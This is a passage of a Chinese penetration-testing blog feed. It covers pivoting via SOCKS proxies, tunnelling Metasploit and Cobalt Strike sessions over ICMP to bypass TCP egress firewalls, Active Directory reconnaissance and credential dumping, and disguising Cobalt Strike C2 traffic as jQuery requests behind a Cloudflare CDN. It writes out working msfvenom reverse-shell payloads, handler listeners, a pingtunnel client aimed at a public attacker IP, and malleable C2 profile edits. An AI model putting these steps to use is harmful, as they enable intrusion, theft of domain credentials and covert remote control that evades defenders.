src="/posts/c4250965/image-20220917200019135.png" alt="image-20220917200019135"></p><p>建立通讯完成<br>传马 connect命令<br><img src="/posts/c4250965/image-20220917200153974.png" alt="image-20220917200153974"><br>成功上线</p><h3 id="MSF通讯-amp-上线-1"><a href="#MSF通讯-amp-上线-1" class="headerlink" title="MSF通讯&amp;上线"></a>MSF通讯&amp;上线</h3><p>一样的思路<br>server2008添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917200328474.png" alt="image-20220917200328474"></p><p>建立socks</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 2233</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917200615556.png" alt="image-20220917200615556"></p><p>传马改监听器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.33.130</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917200817033.png" alt="image-20220917200817033"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>借助socks代理技术可以实现对不出网设备进行通讯和上线，CS和msf俩个工具能用CS就用CS操作方便很多，本文环境主要联系代理实现通讯以及上线，实战环境中比这复杂的多，会有防火墙等设备进行拦截，并且能否传马都需要根据环境进行判断，如果防火墙对tcp流量进行了拦截那么就要用到隧道技术</p><p><img src="/posts/c4250965/image-20220917201341746.png" alt="image-20220917201341746"></p><p><img src="/posts/c4250965/image-20220917201310403.png" alt="image-20220917201310403"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网基础-防火墙规则&amp;组策略</title>
      <link href="/posts/a5e10218/"/>
      <url>/posts/a5e10218/</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础-防火墙规则-amp-组策略"><a href="#内网基础-防火墙规则-amp-组策略" class="headerlink" title="内网基础-防火墙规则&amp;组策略"></a>内网基础-防火墙规则&amp;组策略</h1><p>代理技术和隧道技术分别是什么?</p><ul><li>隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</li><li>代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）<br>连接方向：正向&amp;反向</li></ul><h2 id="单机-防火墙-限制端口出入站"><a href="#单机-防火墙-限制端口出入站" class="headerlink" title="单机-防火墙-限制端口出入站"></a>单机-防火墙-限制端口出入站</h2><p>熟悉常见主机配置不出网的方式</p><p><strong>1、入站&amp;出站&amp;连接安全</strong></p><p>入站即：从外部到内部 如：访问web界面<br>出站即：从内部到外部 如：反向连接shell<br><strong>2、域&amp;专用&amp;公网&amp;状态</strong><br><img src="/posts/a5e10218/image-20220915151933356.png" alt="image-20220915151933356"><br>域:适用在域环境<br>专用:个人环境<br>公用:公共环境<br><strong>3、阻止&amp;允许&amp;其他配置</strong><br><img src="/posts/a5e10218/image-20220915152715593.png" alt="image-20220915152715593"></p><p>程序:针对单个程序进行阻止或者放行<br>端口:针对端口进行阻止或者放行<br>预定义：windows预先设定好的规则<br>自定义:根据自己的需要设定针对程序或端口或协议<br>基础知识已经了解接下来进行测试<br>生成一个监听器为reverse_http的马 端口为8989<br><img src="/posts/a5e10218/image-20220915160019407.png" alt="image-20220915160019407"><br>reverse为反向连接马，bind为正向连接马</p><p>在系统防火墙出站规则限制8989端口<br>运行木马发现没有任何反应，禁用该规则成功上线。<br>木马没有上线的原因就是触发了防火墙规则</p><h2 id="单机-防火墙-限制协议出入站"><a href="#单机-防火墙-限制协议出入站" class="headerlink" title="单机-防火墙-限制协议出入站"></a>单机-防火墙-限制协议出入站</h2><p>添加一条出站规则限制tcp协议 禁止所有tcp协议出站<br><img src="/posts/a5e10218/image-20220915162002946.png" alt="image-20220915162002946"><br>运行木马毫无反应禁用规则重新上线<br><img src="/posts/a5e10218/image-20220915162155407.png" alt="image-20220915162155407"><br>没上线的原因就是触发了tcp协议出站规则<br>限制了tcp协议就没办法上线了么？<br>当然不是的，还可以使用其他协议上线，如下图<br><img src="/posts/a5e10218/w7Lt8eZS5MbUVc3q6nB8gw.png" alt="img"><br><img src="/posts/a5e10218/RTIqD7VEfBePEbjmTbWmtg-1663116129810-3.png" alt="img"><br>学过计网应该知道这些，每层协议都是基于下面一层 如果下面的禁用了上面的也就完蛋，tcp被禁用，还可以使用icmp进行上线，下文中会提到</p><h2 id="域控-防火墙-组策略对象同步"><a href="#域控-防火墙-组策略对象同步" class="headerlink" title="域控-防火墙-组策略对象同步"></a>域控-防火墙-组策略对象同步</h2><p>操作：组策略管理-域-创建GPO链接-防火墙设置<br>域控进入组策略管理<br><img src="/posts/a5e10218/image-20220915164450719.png" alt="image-20220915164450719"><br>在域中创建GPO链接 名称随意<br><img src="/posts/a5e10218/image-20220915164514425.png" alt="image-20220915164514425"></p><p>创建完成后右键编辑进入到策略设置<br><img src="/posts/a5e10218/image-20220915164758655.png" alt="image-20220915164758655"><br>配置防火墙规则禁用tcp协议(记得开启防火墙)<br>域成员更新策略：强制&amp;命令&amp;重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure><p><img src="/posts/a5e10218/image-20220915170227761.png" alt="image-20220915170227761"><br><img src="/posts/a5e10218/image-20220915170551477.png" alt="image-20220915170551477"></p><h2 id="域控-防火墙-组策略不出网上线"><a href="#域控-防火墙-组策略不出网上线" class="headerlink" title="域控-防火墙-组策略不出网上线"></a>域控-防火墙-组策略不出网上线</h2><p><strong>背景介绍</strong>：域控通过组策略设置防火墙规则同步后，域内用户主机被限制TCP出网，其中规则为出站规则，安全研究者通过入站取得SHELL权限，需要对其进行上线控制。<br><strong>思路：</strong>正向连接&amp;隧道技术<br><strong>如果是入站被限制呢？</strong>反向连接&amp;隧道技术也可以解决（前提看限制的多不多）<br>注意域成员主机可出网<br>实战情况下的两种情况:</p><ul><li>主机出站TCP封杀入站没有无互联网网络<br>正向连接（取得一台有网络的能和主机通讯的服务器权限他有网）<br>把数据给出网的机器通过出网机器正向主动控制他</li><li>主机出站TCP封杀入站没有有互联网网络<br>正向连接（取得一台有网络的能和主机通讯的服务器权限他有网）<br>隧道技术（走其他协议出网即可）</li></ul><p>因为域成员主机收到防火墙策略影响可以ping通baidu.com但是不能访问百度(tcp限制)<br>所以可以利用ICMP协议进行上线</p><p>ICMP协议项目：</p><p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a><br><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br>利用思路:<br>就是利用木马将上线流量发送到本地工具端口，工具转换为ICMP流量转到攻击机，攻击机使用工具将收到的icmp流量转化为tcp流量，攻击机接收到上线tcp流量从而上线<br>举例：木马为127.0.0.1 4444端口 ,肉鸡工具监听本地4444端口接收到tcp流量，然后转换为icmp流量发送到攻击机6666端口，攻击机工具将icmp流量转为tcp流量而监听器刚好监听本机6666端口从而上线</p><h4 id="1、CS-ICMP-上线"><a href="#1、CS-ICMP-上线" class="headerlink" title="1、CS-ICMP-上线"></a>1、CS-ICMP-上线</h4><p>这里利用pingtunnel</p><p>攻击机:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server</span><br></pre></td></tr></table></figure><p>肉鸡：(管理器运行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:5555 -s 192.168.46.66 -t 192.168.46.66:6666 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure><p>CS:</p><p>创建两个监听器 一个为127.0.0.1 一个为攻击机ip</p><p><img src="/posts/a5e10218/image-20220915230950801.png" alt="image-20220915230950801"></p><p>生成127.0.0.1的Stager后门<br>肉鸡执行<br><img src="/posts/a5e10218/image-20220915231213985.png" alt="image-20220915231213985"><br>成功上线</p><h4 id="2、MSF上线"><a href="#2、MSF上线" class="headerlink" title="2、MSF上线"></a>2、MSF上线</h4><p>生成后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f exe &gt; xd.exe</span><br></pre></td></tr></table></figure><p>MSF启动监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure><p>攻击机开启隧道：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果运行报错 <span class="built_in">chmod</span> 777 pingtunnel</span></span><br><span class="line">./pingtunnel -type server</span><br></pre></td></tr></table></figure><p><img src="/posts/a5e10218/image-20220915225516712.png" alt="image-20220915225516712"></p><p>肉鸡开启隧道 –将本地3333端口 icmp协议数据转发到攻击机的4444端口流量上(管理员运行)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3333 -s 101.35.21.250 -t 101.35.21.250:4444 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure><p>运行msf生成的木马</p><p><img src="/posts/a5e10218/image-20220915225800488.png" alt="image-20220915225800488"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域信息收集</title>
      <link href="/posts/225ec2c9/"/>
      <url>/posts/225ec2c9/</url>
      
        <content type="html"><![CDATA[<h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h2 id="什么是域环境"><a href="#什么是域环境" class="headerlink" title="什么是域环境"></a>什么是域环境</h2><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，并区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器(DC)，域控制器(DC)中保存着整个域的用户帐号和安全数据库。</p><p>0x01</p><p>一个具有一定规模的企业，每天都可能面临员工入职和离职，因此网络管理部门经常需要对域成员主机进行格式化消除磁盘的文件，然后重装系统及软件，以提供给新员工使用；因此，为了便于后期交接，大多网络管理员会做好一个系统镜像盘，统一安装所有的电脑，并且在安装的时候设置惯用、甚至统一的密码。</p><p>0x02</p><p>因此，域中的计算机本地管理员账号，极有可能能够登陆域中较多的计算机，本地管理员的密码在服务器上后期修改的概率，远低于在个人办公电脑上的概率，而域用户权限是较低的，是无法在域成员主机上安装软件的，这将会发生下面的一幕：</p><p>某个域用户需要使用viso软件进行绘图操作，于是联系网络管理员进行安装，网络管理员采用域管理员身份登录了域成员主机，并帮助其安装了viso软件，于是这个有计算机基础的员工，切换身份登录到了本地计算机的管理员，后执行mimikatz，从内存当中抓取了域管理员的密码，便成功的控制了整个域。</p><p>0x03</p><p>因此，域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p><p>当前机器角色的判断–个人PC&amp;文件服务器&amp;邮件服务器等<br>当前机器网络环境判断–局域网&amp;工作组&amp;域环境<br>当前机器角色功能判断–任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p><h2 id="常规信息类收集-应用-amp-服务-amp-权限等"><a href="#常规信息类收集-应用-amp-服务-amp-权限等" class="headerlink" title="常规信息类收集-应用&amp;服务&amp;权限等"></a>常规信息类收集-应用&amp;服务&amp;权限等</h2><p><img src="/posts/225ec2c9/eetivl27t4uy4YiieUguOQ.png" alt="eetivl27t4uy4YiieUguOQ"><br><img src="/posts/225ec2c9/9dxsuZWjbEPQMl2vx1HSBA.png" alt="9dxsuZWjbEPQMl2vx1HSBA"></p><p>更多其他收集见上图命令表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">systeminfo #详细信息</span><br><span class="line">netstat -ano #端口列表</span><br><span class="line">route print #路由表</span><br><span class="line">net start #启动服务</span><br><span class="line">tasklist #进程列表</span><br><span class="line">schtasks #计划任务</span><br><span class="line">ipconfig /all #判断存在域</span><br><span class="line">net view /domain #判断存在域</span><br><span class="line">net time /domain #判断主域</span><br><span class="line">netstat -ano #当前网络端口开放</span><br><span class="line">nslookup 域名 #追踪来源地址</span><br><span class="line">wmic service list brief #查询本机服务</span><br><span class="line">net config workstation  #查询当前登录域及登录用户信息</span><br><span class="line">wmic startup get command,caption #查看已启动的程序信息</span><br></pre></td></tr></table></figure><h2 id="架构信息类收集-网络-amp-用户-amp-域控等"><a href="#架构信息类收集-网络-amp-用户-amp-域控等" class="headerlink" title="架构信息类收集-网络&amp;用户&amp;域控等"></a>架构信息类收集-网络&amp;用户&amp;域控等</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net view /domain #查询域列表</span><br><span class="line">net time/domain #从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务</span><br><span class="line">net localgroup administrators #本机管理员【通常含有域用户】</span><br><span class="line">net user /domain #查询域用户(当前域)</span><br><span class="line">net group /domain #查询域工作组</span><br><span class="line">net group &quot;domain computers&quot; /domain #查看加入域的所有计算机名</span><br><span class="line">net group &quot;domain admins&quot; /domain #查询域管理员用户组和域管用户</span><br><span class="line">net localgroup administrators /domain #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain #查看域控</span><br><span class="line">net accounts /domain #查看域密码策略</span><br></pre></td></tr></table></figure><h2 id="关键信息类收集-密码-amp-凭据-amp-口令等"><a href="#关键信息类收集-密码-amp-凭据-amp-口令等" class="headerlink" title="关键信息类收集-密码&amp;凭据&amp;口令等"></a>关键信息类收集-密码&amp;凭据&amp;口令等</h2><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS插件</p><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a><br><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a><br><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a><br><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p></blockquote><p>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库Web管理入口，如PHPMyAdmin<br>3.浏览器保存密码、浏览器Cookies<br>4.其他用户会话、3389和ipc$连接记录、回收站内容<br>5.Windows 保存的WIFI密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等<br>利用CS抓取明文密码需要先提权<br>提权:利用CS插件<br><img src="/posts/225ec2c9/image-20220912105234985.png" alt="image-20220912105234985"><br>提权完成后抓取明文密码<br><img src="/posts/225ec2c9/image-20220912105515362.png" alt="image-20220912105515362"><br>在视图中开启密码凭证<br><img src="/posts/225ec2c9/image-20220912105555583.png" alt="image-20220912105555583"></p><h2 id="自动化工具探针-插件-amp-Adfind-amp-BloodHound"><a href="#自动化工具探针-插件-amp-Adfind-amp-BloodHound" class="headerlink" title="自动化工具探针-插件&amp;Adfind&amp;BloodHound"></a>自动化工具探针-插件&amp;Adfind&amp;BloodHound</h2><blockquote><p><a href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p></blockquote><p>CS插件:LSTAR Ladon OLa TaoWu等<br>上传Adfind进行自动化信息搜集<br><img src="/posts/225ec2c9/image-20220912110250086.png" alt="image-20220912110250086"></p><p>Adfind常见命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出域控制器名称</span></span><br><span class="line">AdFind -sc dclist </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中在线的计算机</span></span><br><span class="line">AdFind -sc computers_active</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中在线的计算机(只显示名称和操作系统)</span></span><br><span class="line">AdFind -sc computers_active name operatingSystem</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中所有计算机</span></span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中所有计算机(只显示名称和操作系统)</span></span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询域内所有用户</span></span><br><span class="line">AdFind -users name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询所有GPO</span></span><br><span class="line">AdFind -sc gpodmp </span><br></pre></td></tr></table></figure><p><img src="/posts/225ec2c9/image-20220912123714674.png" alt="image-20220912123714674"></p><p>BloodHound域分析使用</p><blockquote><p>BloodHound 是一个强大的内网域渗透提权分析工具，构建于 <a href="http://linkurio.us/">Linkurious</a> 之上。BloodHound 采用了原始的 PowerPath 概念背后的一些关键概念，并将这些概念放在一个能运行且直观，并易于使用的功能中，用于提取和分析数据，可以高效准确地显示如何提升 AD 域中的权限。它可以显示两个域中的 “域管理员” 组的有效成员。</p></blockquote><p>安装&amp;使用：</p><blockquote><p><a href="http://cn-sec.com/archives/146548.html">http://cn-sec.com/archives/146548.html</a><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p></blockquote><p>上传SharpHound.exe(\resources\app\Collectors下)到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p><img src="/posts/225ec2c9/image-20220912124235379.png" alt="image-20220912124235379"></p><p>会生成一个压缩包</p><p>本地启动分析</p><p>1、启动neo4j 下载好后直接运行即可</p><blockquote><p><a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p>启动完成到<a href="http://localhost:7474/browser/%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81">http://localhost:7474/browser/修改密码</a></p><p>2、启动BloodHound 直接运行 BloodHound.exe<br>账号密码为就是neo4j的账号密码<br>3、运行程序后将生成数据导入，筛选查看<br><img src="/posts/225ec2c9/image-20220912143847126.png" alt="image-20220912143847126"><br>上传刚才生成的压缩包<br><img src="/posts/225ec2c9/image-20220912143921209.png" alt="image-20220912143921209"><br>点击左上角展开菜单<br><img src="/posts/225ec2c9/image-20220912144033107.png" alt="image-20220912144033107"></p><p>Analysis为所有功能<br><img src="/posts/225ec2c9/image-20220912144311135.png" alt="image-20220912144311135"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Find all Domain Admins  #找到所有域管理员</span><br><span class="line">Find Shortest Paths to Domain Admins #找到域管理员的最短路径</span><br><span class="line">Find Principals with DCSync Rights #查找具有DCSync权限的主体</span><br><span class="line">Users with Foreign Domain Group Membership #具有外部域组成员资格的用户</span><br><span class="line">Groups with Foreign Domain Group Membership #具有外国域组成员的组</span><br><span class="line">Map Domain Trusts #映射领域信托</span><br><span class="line">Shortest Paths to Unconstrained Delegation Systems #无约束委托系统的最短路径 </span><br><span class="line">Shortest Paths from Kerberoastable Users 从kerberostabable #用户的最短路径</span><br><span class="line">Shortest Paths to Domain Admins from Kerberoastable Users #从kerberostable用户到域管理员的最短路径</span><br><span class="line">Shortest Path from Owned Principals #从所有主体出发的最短路径</span><br><span class="line">Shortest Paths to Domain Admins from Owned Principals #从所属主体到域管理员的最短路径</span><br><span class="line">Shortest Paths to High Value Targets #到高价值目标的最短路径</span><br><span class="line">Find Computers where Domain Users are Local Admin #查找域用户为本地管理员的计算机</span><br><span class="line">Find Computers where Domain Users can read LAPS passwords #查找域用户可以读取LAPS密码的计算机</span><br><span class="line">Shortest Paths from Domain Users to High Value Targets #从域用户到高价值目标的最短路径</span><br><span class="line">Find All Paths from Domain Users to High Value Targets #找到从域用户到高值目标的所有路径</span><br><span class="line">Find Workstations where Domain Users can RDP #找到域用户可以RDP的工作站</span><br><span class="line">Find Servers where Domain Users can RDP #找到域用户可以RDP的服务器</span><br><span class="line">Find Dangerous Rights for Domain Users Groups #查找域用户组的危险权限</span><br><span class="line">Find Kerberoastable Members of High Value Groups #查找高值组中可支持kerberos的成员</span><br><span class="line">List all Kerberoastable Accounts #列出所有可kerberos的帐户</span><br><span class="line">Find Kerberoastable Users with most privileges #查找具有最多特权的可支持kerberostaber的用户</span><br><span class="line">Find Domain Admin Logons to non-Domain Controllers #找到非域控制器的域管理登录</span><br><span class="line">Find Computers with Unsupported Operating Systems #查找操作系统不受支持的计算机</span><br><span class="line">Find AS-REP Roastable Users (DontReqPreAuth) #查找AS-REP烘烤用户(DontReqPreAuth)</span><br></pre></td></tr></table></figure><p>点击可查看详细信息<br><img src="/posts/225ec2c9/image-20220912145106437.png" alt="image-20220912145106437"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike流量隐匿</title>
      <link href="/posts/a28d2b5c/"/>
      <url>/posts/a28d2b5c/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike流量隐匿"><a href="#CobaltStrike流量隐匿" class="headerlink" title="CobaltStrike流量隐匿"></a>CobaltStrike流量隐匿</h1><h2 id="防朔源拉黑-CDN节点"><a href="#防朔源拉黑-CDN节点" class="headerlink" title="防朔源拉黑-CDN节点"></a>防朔源拉黑-CDN节点</h2><h4 id="1、在godaddy注册账号，买个域名"><a href="#1、在godaddy注册账号，买个域名" class="headerlink" title="1、在godaddy注册账号，买个域名"></a>1、在godaddy注册账号，买个域名</h4><p><a href="https://sg.godaddy.com/">https://sg.godaddy.com/</a></p><h4 id="2、在cloudflare注册账号-然后添加域名"><a href="#2、在cloudflare注册账号-然后添加域名" class="headerlink" title="2、在cloudflare注册账号,然后添加域名"></a>2、在cloudflare注册账号,然后添加域名</h4><p><a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a><br><img src="/posts/a28d2b5c/image-20220905230534596.png" alt="image-20220905230534596"><br><img src="/posts/a28d2b5c/image-20220905230629036.png" alt="image-20220905230629036"><br>这里只是测试选不要钱的实战尽量选择付费的节点多一点</p><h4 id="3、添加解析记录，指向CS的IP"><a href="#3、添加解析记录，指向CS的IP" class="headerlink" title="3、添加解析记录，指向CS的IP"></a>3、添加解析记录，指向CS的IP</h4><p><img src="/posts/a28d2b5c/image-20220906085905127.png" alt="image-20220906085905127"><br>type选择A Name随便 IPv4为自己的cs服务端地址  保存继续</p><h4 id="4、配置DNS服务器，使用cloudflare"><a href="#4、配置DNS服务器，使用cloudflare" class="headerlink" title="4、配置DNS服务器，使用cloudflare"></a>4、配置DNS服务器，使用cloudflare</h4><p>按照说明配置DNS服务器<br><img src="/posts/a28d2b5c/image-20220905231040010.png" alt="image-20220905231040010"><br>先去godaddy修改域名服务器–进入到域名DNS管理往下拉<br><img src="/posts/a28d2b5c/image-20220905231515063.png" alt="image-20220905231515063"><br><img src="/posts/a28d2b5c/image-20220905231605856.png" alt="image-20220905231605856"><br>修改为cloudflare显示的内容，修改完成后回到cloudflare 点击进行检测<br><img src="/posts/a28d2b5c/image-20220905231743974.png" alt="image-20220905231743974"><br><img src="/posts/a28d2b5c/image-20220905231849382.png" alt="image-20220905231849382"><br>等待检查完成<br><img src="/posts/a28d2b5c/image-20220906084008556.png" alt="image-20220906084008556"><br>收到邮件后用超级ping测试</p><h4 id="5、下载C2文件模版，修改配置并上传"><a href="#5、下载C2文件模版，修改配置并上传" class="headerlink" title="5、下载C2文件模版，修改配置并上传"></a>5、下载C2文件模版，修改配置并上传</h4><p><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a><br>选择CS对应的版本修改 我是4.5版本就修改jquery-c2.4.5.profile<br>搜索http get<br><img src="/posts/a28d2b5c/image-20220906090721630.png" alt="image-20220906090721630"><br>修改为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/jquery-3.3.1.min.js&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;你配置的域名&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://你配置的域名/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend &quot;__cfduid=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>搜索http post<br><img src="/posts/a28d2b5c/image-20220906091200776.png" alt="image-20220906091200776"><br>修改为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/jquery-3.3.2.min.js&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.woaikansese.shop&quot;;</span><br><span class="line">        header &quot;Referer&quot; 